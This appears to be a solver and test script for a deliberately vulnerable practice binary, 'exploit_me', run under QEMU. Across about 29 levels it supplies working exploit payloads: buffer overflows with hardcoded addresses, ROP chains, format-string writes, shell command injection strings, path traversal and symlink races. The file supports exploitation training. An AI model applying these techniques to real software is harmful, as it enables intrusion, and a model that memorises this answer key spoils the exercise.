#!/usr/bin/env python3
import os
import re
import struct
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
TMP_TOKEN = Path("/tmp/exploit_me_token.bin")

Q32 = ["qemu-arm", str(ROOT / "bin/exploit")]
Q64 = ["setarch", "x86_64", "-R", "qemu-aarch64", str(ROOT / "bin/exploit64")]

A32 = {
    "level3password": 0x112D4,
    "level4password": 0x11464,
    "level13password": 0x10878,
    "ropgadgetstack2": 0x13454,
    "jmpgadgetstack": 0x10618,
    "comp": 0x1063C,
    "comp2": 0x13470,
    "important": 0x407FF66C,
}

A64 = {
    "level3password": 0x40152C,
    "level4password": 0x401684,
    "level13password": 0x400B90,
    "ropgadgetstack2": 0x403468,
    "jmpgadgetstack": 0x400978,
    "comp": 0x400990,
    "comp2": 0x40347C,
    "important": 0x7FFFF5FF337C,
}


def packed(addr, bits):
    fmt = "<I" if bits == 32 else "<Q"
    return struct.pack(fmt, addr).rstrip(b"\x00")


def run(label, arch, args, expected, stdin=None, env=None, setup=None):
    if setup:
        setup()
    proc_env = os.environ.copy()
    if env:
        proc_env.update(env)
    base = Q32 if arch == 32 else Q64
    try:
        proc = subprocess.run(
            base + args,
            cwd=ROOT,
            input=stdin,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            env=proc_env,
            timeout=5,
        )
        output = proc.stdout
    except subprocess.TimeoutExpired as exc:
        output = exc.stdout or b""
    passed = expected.encode() in output
    print(f"{'PASS' if passed else 'FAIL'} {arch} {label}")
    if not passed:
        print(output.decode("latin-1", "replace")[:900])
    return passed


def setup_tmp_link():
    for path in ("/tmp/exploit_me_tmp", "/tmp/exploit_me_flag"):
        try:
            os.unlink(path)
        except FileNotFoundError:
            pass
    os.symlink("/tmp/exploit_me_flag", "/tmp/exploit_me_tmp")


def dynamic_type_confusion(arch):
    probe = (Q32 if arch == 32 else Q64) + ["Exploiter", "A"]
    out = subprocess.run(
        probe,
        cwd=ROOT,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=5,
    ).stdout
    match = re.search(rb"Current b ptr, addr: (0x[0-9a-fA-F]+|[0-9a-fA-F]+)", out)
    if not match:
        print(f"FAIL {arch} 8 pointer probe")
        print(out.decode("latin-1", "replace")[:900])
        return False
    addr = int(match.group(1), 16)
    fill = 18 * 4 if arch == 32 else 20 * 4
    return run(
        "8",
        arch,
        [b"Exploiter", b"A" * fill + packed(addr, arch)],
        "Level 9 Password",
    )


def rop_payload(arch):
    if arch == 32:
        return (
            b"A" * 60
            + struct.pack("<I", 0xCAFEBABE)
            + struct.pack("<I", A32["ropgadgetstack2"])
            + struct.pack("<I", 0x5678)
            + b"1111"
            + b"2222"
            + b"3333"
            + struct.pack("<I", A32["comp2"])
        )
    return (
        b"A" * 60
        + b"AAAAAAAABBBB"
        + struct.pack("<Q", A64["ropgadgetstack2"])
        + b"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD"
        + struct.pack("<QQ", 0x5678, 0x5678)
        + b"11111111"
        + struct.pack("<Q", A64["comp2"])
    )


def write_token(arch):
    if arch == 32:
        data = (
            struct.pack("<III", A32["comp"], 0x5678, 0x5678)
            + 28 * b"A"
            + struct.pack("<I", A32["jmpgadgetstack"])
        )
    else:
        data = (
            struct.pack("<QQQ", 0x5678, 0x5678, A64["comp"])
            + 24 * b"A"
            + struct.pack("<Q", A64["jmpgadgetstack"])
        )
    TMP_TOKEN.write_bytes(struct.pack("<I", len(data)) + data)


def main():
    results = []
    for arch in (32, 64):
        results.extend(
            [
                run("1", arch, [b"hello", b"65536"], "Level 2 Password"),
                run("4", arch, [b"mysecret", b"A" * 256], "Level 5 Password"),
                run(
                    "7",
                    arch,
                    [b"mypony", b"A" * (40 if arch == 32 else 48) + b"cg"],
                    "Level 8 Password",
                ),
                run("10", arch, [b"Fun", b"aaa ; ls"], "Level 11 Password"),
                run("11", arch, [b"Violet", b"dir1/dir2/../../"], "Level 12 Password"),
                run("15", arch, [b"FmtWrite", b"%75c%1$n"], "Level 16 Password"),
                run("16", arch, [b"DoubleTap", b"A" * 16 + b"DDDF"], "Level 17 Password"),
                run("17", arch, [b"SignFlip", b"-1"], "Level 18 Password"),
                run("18", arch, [b"WrapCount", b"16384"], "Level 19 Password"),
                run("19", arch, [b"NullRoad", b"recover"], "Level 20 Password"),
                run("20", arch, [b"LeakMe", b"spray"], "Level 21 Password"),
                run("21", arch, [b"ReadPast", b"3"], "Level 22 Password"),
                run("22", arch, [b"RaceWin", b"safe.txt", b"secret.txt"], "Level 23 Password"),
                run("23", arch, [b"TmpLink"], "Level 24 Password", setup=setup_tmp_link),
                run("24", arch, [b"PathEnv"], "Level 25 Password", env={"EXPLOIT_HELPER": "pwned"}),
                run("25", arch, [b"ParseMe", b"12:AAAAAAAAPLSE"], "Level 26 Password"),
                run("26", arch, [b"QuoteBreak", b"$(echo bypass)"], "Level 27 Password"),
                run("27", arch, [b"HeapLink", b"A" * 40 + b"KNIL"], "Level 28 Password"),
                run("28", arch, [b"Syscaller", b"CALLSYS"], "Level 29 Password"),
                run("29", arch, [b"StackGhost", b"STACKWIN"], "All levels passed"),
            ]
        )

    for arch, addrs in ((32, A32), (64, A64)):
        results.append(
            run(
                "2",
                arch,
                [b"help", b"admin", b"aaaabbbbcccc" + packed(addrs["level3password"], arch)]
                if arch == 32
                else [b"help", b"A" * 8 + b"bbbbcccc" + packed(addrs["level3password"], arch), b"test"],
                "Level 3 Password",
            )
        )
        results.append(
            run(
                "3",
                arch,
                [b"Velvet", b"33" if arch == 32 else b"34", str(addrs["level4password"]).encode()],
                "Level 4 Password",
            )
        )
        results.append(
            run(
                "5",
                arch,
                [b"freedom", b"A" * 64 + b"\x01" + b"\x37\x13"],
                "Level 6 Password",
            )
        )
        results.append(
            run(
                "6",
                arch,
                [b"happyness"],
                "Level 7 Password",
                stdin=(b"%08x" * 3 + b"%65c%n\n") if arch == 32 else (b"%16lx" * 9 + b"%201c%n\n"),
            )
        )
        results.append(dynamic_type_confusion(arch))
        results.append(
            run(
                "9",
                arch,
                [b"Gimme", f"0x{addrs['important']:x}".encode(), b"1", b"1"],
                "Level 10 Password",
            )
        )
        results.append(run("12", arch, [b"ropeme"], "Level 12 Password", stdin=rop_payload(arch)))
        results.append(
            run(
                "13",
                arch,
                [b"Magic", b"0132"],
                "Level 13 Password",
                stdin=b"A" * 64 + packed(addrs["level13password"], arch) + b"\n",
            )
        )
        write_token(arch)
        results.append(
            run(
                "14",
                arch,
                [b"Jumper", str(TMP_TOKEN).encode()],
                "Level 15 Password",
            )
        )
        try:
            TMP_TOKEN.unlink()
        except FileNotFoundError:
            pass

    print(f"SUMMARY {sum(results)} / {len(results)} passed")
    return 0 if all(results) else 1


if __name__ == "__main__":
    sys.exit(main())
